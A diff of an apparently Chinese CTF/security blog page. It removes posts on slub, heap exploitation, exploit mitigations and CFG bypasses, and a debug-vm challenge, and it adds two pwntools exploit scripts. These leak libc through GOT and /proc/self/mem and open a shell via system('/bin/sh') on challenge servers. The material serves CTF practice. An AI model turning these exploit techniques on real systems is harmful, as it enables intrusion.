@@ -62,79 +62,24 @@
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/12/11/sulb/">slub</a></h1>
+    <h1 class="title"><a href="/2018/12/11/文件读写内存实例/">文件读写内存实例</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <p>slub机制彻底图解分析<br>转载 2017年01月27日 08:57:17标签：slub机制 /slab机制 /linux /kernel /内存管理1333</p>
-<pre><code>内核管理页面使用了2个算法：伙伴算法和slub算法，伙伴算法以页为单位管理内存，但在大多数情况下，程序需要的并不是一整页，而是几个、几十个字节的小内存。于是需要另外一套系统来完成对小内存的管理，这就是slub系统。slub系统运行在伙伴系统之上，为内核提供小内存管理的功能。
-
- slub把内存分组管理，每个组分别包含2^3、2^4、...2^11个字节，在4K页大小的默认情况下，另外还有两个特殊的组，分别是96B和192B，共11组。之所以这样分配是因为如果申请2^12B大小的内存，就可以使用伙伴系统提供的接口直接申请一个完整的页面即可。
-
- slub就相当于零售商，它向伙伴系统“批发”内存，然后在零售出去。一下是整个slub系统的框图：
-
-
-
-  一切的一切源于kmalloc_caches[12]这个数组，该数组的定义如下：
-</code></pre><pre><code>struct kmem_cache kmalloc_caches[PAGE_SHIFT] __cacheline_aligned;
-</code></pre><pre><code>每个数组元素对应一种大小的内存，可以把一个kmem_cache结构体看做是一个特定大小内存的零售商，整个slub系统中共有12个这样的零售商，每个“零售商”只“零售”特定大小的内存，例如：有的“零售商”只&quot;零售&quot;8Byte大小的内存，有的只”零售“16Byte大小的内存。
-
-每个零售商(kmem_cache)有两个“部门”，一个是“仓库”：kmem_cache_node，一个“营业厅”：kmem_cache_cpu。“营业厅”里只保留一个slab，只有在营业厅(kmem_cache_cpu)中没有空闲内存的情况下才会从仓库中换出其他的slab。
-所谓slab就是零售商(kmem_cache)批发的连续的整页内存，零售商把这些整页的内存分成许多小内存，然后分别“零售”出去，一个slab可能包含多个连续的内存页。slab的大小和零售商有关。
-</code></pre><p>相关数据结构：</p>
-<pre><code>    物理页按照对象(object)大小组织成单向链表，对象大小时候objsize指定的。例如16字节的对象大小，每个object就是16字节，每个object包含指向下一个object的指针，该指针的位置是每个object的起始地址+offset。每个object示意图如下：
-
-
-void*指向的是下一个空闲的object的首地址，这样object就连成了一个单链表。
-向slub系统申请内存块(object)时：slub系统把内存块当成object看待
-
-slub系统刚刚创建出来，这是第一次申请。    
-此时slub系统刚建立起来，营业厅(kmem_cache_cpu)和仓库(kmem_cache_node)中没有任何可用的slab可以使用，如下图中1所示：
-因此只能向伙伴系统申请空闲的内存页，并把这些页面分成很多个object，取出其中的一个object标志为已被占用，并返回给用户，其余的object标志为空闲并放在kmem_cache_cpu中保存。kmem_cache_cpu的freelist变量中保存着下一个空闲object的地址。上图2表示申请一个新的slab，并把第一个空闲的object返回给用户，freelist指向下一个空闲的object。
-
-slub的kmem_cache_cpu中保存的slab上有空闲的object可以使用。
-这种情况是最简单的一种，直接把kmem_cache_cpu中保存的一个空闲object返回给用户，并把freelist指向下一个空闲的object。
-
-
-slub已经连续申请了很多页，现在kmem_cache_cpu中已经没有空闲的object了，但kmem_cache_node的partial中有空闲的object 。所以从kmem_cache_node的partial变量中获取有空闲object的slab，并把一个空闲的object返回给用户。
-
-
-kmem_cache_cpu中已经都被占用的slab放到仓库中，kmem_cache_node中有两个双链表，partial和full，分别盛放不满的slab(slab中有空闲的object)和全满的slab(slab中没有空闲的object)。然后从partial中挑出一个不满的slab放到kmem_cache_cpu中。
-
-kmem_cache_cpu中中找出空闲的object返回给用户。
-
-
-slub已经连续申请了很多页，现在kmem_cache_cpu中保存的物理页上已经没有空闲的object可以使用了，而此时kmem_cache_node中没有空闲的页面了，只能向内存管理器(伙伴算法)申请slab。并把该slab初始化，返回第一个空闲的object。
-
-
-kmem_cache_node中没有空闲的object可以使用，所以只能重新申请一个slab。
-
-
-
-把新申请的slab中的一个空闲object返回给用户使用，freelist指向下一个空闲object。
-向slub系统释放内存块(object)时，如果kmem_cache_cpu中缓存的slab就是该object所在的slab，则把该object放在空闲链表中即可，如果kmem_cache_cpu中缓存的slab不是该object所在的slab，然后把该object释放到该object所在的slab中。在释放object的时候可以分为一下三种情况：
-
-object在释放之前slab是full状态的时候（slab中的object都是被占用的），释放该object后，这是该slab就是半满（partail）的状态了，这时需要把该slab添加到kmem_cache_node中的partial链表中。
-
-
-
-slab是partial状态时（slab中既有object被占用，又有空闲的），直接把该object加入到该slab的空闲队列中即可。
-该object在释放后，slab中的object全部是空闲的，还需要把该slab释放掉。
-这一步产生一个完全空闲的slab，需要把这个slab释放掉。
-</code></pre>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">attack()</span><br><span class="line">change_host()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io2 = process(<span class="string">'./play'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io2 = remote(<span class="string">'47.104.90.157'</span>, <span class="number">30003</span>)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io2.recvuntil(<span class="string">'login:'</span>)</span><br><span class="line">io2.sendline(name)</span><br><span class="line">io2.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">io2.close()</span><br><span class="line">hacking(<span class="number">1</span>)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./play'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x80492C0</span>) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br><span class="line">log.info(<span class="string">'bin_sh:%#x'</span> % bin_sh)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io = process(<span class="string">'./fileManager'</span>, aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:</span><br><span class="line"><span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x56555F2C\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">'47.104.188.138'</span>, <span class="number">30007</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mod</span><span class="params">(name, offset, size)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\xae\xb9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mod</span><span class="params">(name, offset, size, content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\x9d\x97\x3a'</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io.recvuntil(<span class="string">'FTP:'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">read_mod(<span class="string">'/proc/self/maps'</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">elf_base = int(io.recvn(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'elf_base:%#x'</span> % elf_base)</span><br><span class="line">elf = ELF(<span class="string">'fileManager'</span>)</span><br><span class="line">read_mod(<span class="string">'/proc/self/mem'</span>, elf_base + elf.got[<span class="string">'open'</span>], <span class="number">0x100</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br></pre></td></tr></table></figure>
       
     </div>
     
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -154,332 +99,10 @@ slab是partial状态时（slab中既有object被占用，又有空闲的），�
     <header>
       
         <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/12/11/unleak/">unleak利用</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>不基于信息泄露的堆利用方法</p>
-<p>首先，假设可以申请任意长度的堆块，并且存在漏洞，申请后的堆块可以使用。</p>
-<p>我们通过漏洞制造fastbin中的堆块与unsortbin中的堆块重合。（可以用roman）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0 ◂— 0x10</span><br><span class="line">0x30: 0 ◂— 0x10</span><br><span class="line">0x40: 0 ◂— 0x10</span><br><span class="line">0x50: 0 ◂— 0x10</span><br><span class="line">0x60: 0 ◂— 0x10</span><br><span class="line">0x70: 0x5866c0 —▸ 0 ◂— 0x10</span><br><span class="line">0x80: 0 ◂— 0x10</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x586530 ◂— 0x7f7eb0d07b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
-<p>然后申请堆块，使得unsortedbin与fastbins重合，导致fastbin的指针指向main_arena，</p>
-<p>接着，通过局部覆盖使得fastbin指向malloc_hook前面</p>
-<p>然后设置malloc_hook大小，然后通过unsortbin attach 狙击main_arena，然后改变大小</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
         
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
       
   
-    <h1 class="title"><a href="/2018/11/27/MemGC/">几种安全机制</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="MemGC"><a href="#MemGC" class="headerlink" title="MemGC"></a>MemGC</h1><p>memgc是edge的一个防止uaf的机制。</p>
-<h2 id="1、分配"><a href="#1、分配" class="headerlink" title="1、分配"></a>1、分配</h2><p>分配内存时候将一个标记插入chunk中。</p>
-<h2 id="2-释放"><a href="#2-释放" class="headerlink" title="2.释放"></a>2.释放</h2><p>当程序释放内存时，并不回收内存，而是清理标记为。</p>
-<h2 id="3-回收"><a href="#3-回收" class="headerlink" title="3.回收"></a>3.回收</h2><p>当释放的内存到达一定数量，进行扫描，只有没有标记并且在堆栈寄存器中都没有引用的chunk才会被真正回收。</p>
-<h1 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h1><p>检测程序间接跳转地址是否合理，在间接跳转前调用检测函数。</p>
-<p>访问一个bitmap（称为CFGBitmap），其表示在进程空间内所有函数的起始位置。在进程空间内每8个字节的状态对应CFGBitmap中的一位。如果在每组8字节中有函数的起始地址，则在CFGBitmap中对应的位设置为1；否则设置为0。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">一个例子</span><br><span class="line"></span><br><span class="line">目标地址 ：</span><br><span class="line">0x00b613a0 = ‭00000000 10110110 00010011 10100000‬ (b)</span><br><span class="line">首先取高位的3个字节：00000000 10110110 00010011 = 0x00b613</span><br><span class="line">那么CFGbitmap的基地址加上 0x00b613 就是指向一个字节单元的指针。</span><br><span class="line">这个指针最终取到的假设是：</span><br><span class="line">CFGBitmap ：0x10100444 = 0001 0000 0001 0000 0000 0100 0100 0100(b)</span><br><span class="line">接着判断目标地址是否以0x10对齐：地址 &amp; 0xf 是否等于 0 ；</span><br><span class="line"></span><br><span class="line">如果等于0，那偏移是：最低字节二进制位的前5位，这里就是 10100；</span><br><span class="line">若不等于0，则偏移是： 10100|0x1。</span><br><span class="line">这里的例子，0x00b613a0 &amp; 0xf = 0 ，所以偏移： 1010 0 = 20 (d)</span><br><span class="line">这个偏移就是该函数在CFGbitmap中第20位的位置上，若这个位置是1，说明该函数调用是合法有效的，反之则不是。</span><br><span class="line">那么：</span><br><span class="line">CFGBitmap ：0x10100444 = 0001 0000 0001 0000 0000 0100 0100 0100(b)</span><br><span class="line">第20位加粗的 1 ，说明这个调用合法有效。</span><br></pre></td></tr></table></figure>
-<p>绕过CFG保护的思路还包括跳转到有效的API地址（如LoadLibrary）[41]、覆盖堆栈数据（如返回地址）</p>
-<h1 id="VTGuard"><a href="#VTGuard" class="headerlink" title="VTGuard"></a>VTGuard</h1><ul>
-<li>用以检测vftable指针的修改，使用一个canary存储在每个有效虚表的特定位置。vftable使用前，代码会检查canary的值。</li>
-<li>因此攻击者需要去leak/brute-force这个canary值，放在自己伪造的虚表中。</li>
-</ul>
-<p>目前这个只对edge部分类有效</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/15/debug-vm分析/">debug-vm分析</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="debug-vm分析"><a href="#debug-vm分析" class="headerlink" title="debug-vm分析"></a>debug-vm分析</h1><p>分析下强网杯的虚拟机题目。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序大到看不懂，字符串查看</span><br><span class="line">T%02xthread:%02x;</span><br><span class="line">发现是gdb server stub</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ncat -vc ./debug-vm -kl 0.0.0.0 4444</span><br><span class="line">挂起程序</span><br><span class="line">gdb远程连接上去</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Could not check ASLR: Couldn&apos;t get randomize_va_space</span><br><span class="line">Could not check ASLR: Couldn&apos;t get personality</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">[──────────────────────────────────REGISTERS───────────────────────────────────]</span><br><span class="line"> EAX  0 ◂— 0x0</span><br><span class="line"> EBX  0 ◂— 0x0</span><br><span class="line"> ECX  0 ◂— 0x0</span><br><span class="line"> EDX  0 ◂— 0x0</span><br><span class="line"> EDI  0 ◂— 0x0</span><br><span class="line"> ESI  0 ◂— 0x0</span><br><span class="line"> EBP  0 ◂— 0x0</span><br><span class="line"> ESP  0 ◂— 0x0</span><br><span class="line"> EIP  0 ◂— 0x0</span><br><span class="line">[────────────────────────────────────DISASM────────────────────────────────────]</span><br><span class="line"> ► 0x0     inc    edx</span><br><span class="line">   0x1     add    byte ptr [ecx], al</span><br><span class="line">   0x3     add    byte ptr [eax], al</span><br><span class="line">   0x5     add    byte ptr [edx + 1], al</span><br><span class="line">   0x8     add    dword ptr [eax], eax</span><br><span class="line">   0xa     add    byte ptr [eax], al</span><br><span class="line">   0xc     inc    edx</span><br><span class="line">   0xd     add    al, byte ptr [eax]</span><br><span class="line">   0xf     add    byte ptr [eax], al</span><br><span class="line">   0x11    add    byte ptr [eax + 2], cl</span><br><span class="line">   0x14    add    byte ptr fs:[eax], al</span><br><span class="line">[────────────────────────────────────STACK─────────────────────────────────────]</span><br><span class="line">00:0000│ eax ebx ecx edx edi esi ebp esp eip eflags  0 ◂— 0x0</span><br><span class="line">01:0004│                                             4 ◂— 0x4</span><br><span class="line">[──────────────────────────────────BACKTRACE───────────────────────────────────]</span><br><span class="line"> ► f 0        0</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">逆向花了好大功夫，网上神一句不难，这东西魔改过，不能照着字符串直接搜。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">首先搜索$符号找到gdb_read_byte</span><br><span class="line">然后顺着这个函数找到调用的函数gdb_handlesig</span><br><span class="line">gdb_read_byte里面有个输出字符的函数put_buffer </span><br><span class="line">下面是gdb_handle_packet</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">gdb通信协议</span><br><span class="line">协议定义</span><br><span class="line">        GDB RemoteSerial Protocol（RSP）是一种简单的，通过串口线、网络等至少支持半双工通信的媒介进行ASCII消息传输的协议。</span><br><span class="line"></span><br><span class="line">        RSP包以$符号作为数据包的开始，后跟一个或多个用于组成要发送的消息的ASCII字节，并以#作为数据包的结束。再#后，还有两个16进制的ASCII字符作为要发送的消息的校验和。一个完整的RSP协议数据包如下：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">$m4015bc,2#5a</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        消息的接收方会立即返回‘+’表示正确接收数据，或‘-’表示没有正确接收数据。当返回‘-’时，GDB会将错误码返回给用户，并无条件挂起GDB进程。</span><br><span class="line"></span><br><span class="line">目标机按接收到的指令次序，依次将信息输出在GDB的console中。除非GDB进程中有其他的命令正在执行，否则来自目标机的信息将会在任意时刻输出在console中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set debug remote 1查看交互信息</span><br><span class="line">Sending packet: $T1#85...Ack</span><br><span class="line">Packet received: OK</span><br><span class="line">Sending packet: $m5624f000,1#91...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $me6b53000,1#bf...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">0x00000000 in ?? ()</span><br><span class="line">Sending packet: $m5624f888,4#ac...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $me6b5314d,4#fb...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $me6b5314d,4#fb...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m65,4#38...Ack</span><br><span class="line">Packet received: 00000000</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br><span class="line">Sending packet: $m10042,4#c4...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br><span class="line">Sending packet: $m10042,4#c4...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br><span class="line">Sending packet: $m10042,4#c4...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br></pre></td></tr></table></figure>
-<p>附上rsp协议。<a href="https://blog.csdn.net/HMSIWTV/article/details/8759129" target="_blank" rel="noopener">https://blog.csdn.net/HMSIWTV/article/details/8759129</a></p>
-<p>然后是虚拟机的漏洞挖掘，不特别，不搞了。</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/13/符号表恢复/">符号表恢复</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="符号表恢复"><a href="#符号表恢复" class="headerlink" title="符号表恢复"></a>符号表恢复</h1><h2 id="flair"><a href="#flair" class="headerlink" title="flair"></a>flair</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pelf.exe ./libgmp.a ./a.pat</span><br><span class="line">skipped 1, total 510</span><br><span class="line">sigmake.exe ./a.pat b.sig</span><br><span class="line">b.sig: modules/leaves: 462/509, COLLISIONS: 3</span><br><span class="line">See the documentation to learn how to resolve collisions.</span><br></pre></td></tr></table></figure>
-<h2 id="rizzo"><a href="#rizzo" class="headerlink" title="rizzo"></a>rizzo</h2><p>安装rizzo插件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arm架构的libc在 /usr/arm-linux-gnueabihf/lib里面</span><br><span class="line">file--&gt;Produce file--&gt;Rizzo signature file使用rizzo</span><br><span class="line"> file--&gt;Load file--&gt;Rizzo signature file加载符号</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/13/arm架构初探/">arm架构利用</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="arm架构漏洞利用"><a href="#arm架构漏洞利用" class="headerlink" title="arm架构漏洞利用"></a>arm架构漏洞利用</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br><span class="line">qemu安装</span><br><span class="line">apt search &quot;libc6&quot; | grep ARCH</span><br></pre></td></tr></table></figure>
-<h2 id="typo题"><a href="#typo题" class="headerlink" title="typo题"></a>typo题</h2><p>静态连接符号表恢复，参见静态表恢复文章</p>
-<p>qemu打开程序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234  ./typo</span><br><span class="line">这道题是静态连接所以不需要-L，但是动态连接的程序需要这样 -L /usr/mipsel-linux-gnu/</span><br><span class="line">gdb-multiarch ./typo -q</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
